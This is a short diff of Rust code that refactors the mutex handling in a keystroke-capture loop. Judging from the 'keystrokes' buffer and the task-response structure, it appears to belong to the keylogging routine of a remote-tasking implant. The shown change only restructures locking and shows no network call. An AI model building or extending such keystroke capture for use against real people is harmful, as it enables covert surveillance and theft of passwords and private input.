@@ -178,12 +178,18 @@ pub async fn execute(task: Task) {
             break;
         }
 
-        let mut ks = keystrokes.lock().unwrap();
-        if !ks.is_empty() {
-            let captured = ks.clone();
-            ks.clear();
-            drop(ks);
+        let captured = {
+            let mut ks = keystrokes.lock().unwrap();
+            if ks.is_empty() {
+                None
+            } else {
+                let c = ks.clone();
+                ks.clear();
+                Some(c)
+            }
+        };
 
+        if let Some(captured) = captured {
             let mut msg = crate::structs::Response {
                 task_id: task_id.clone(),
                 ..Default::default()
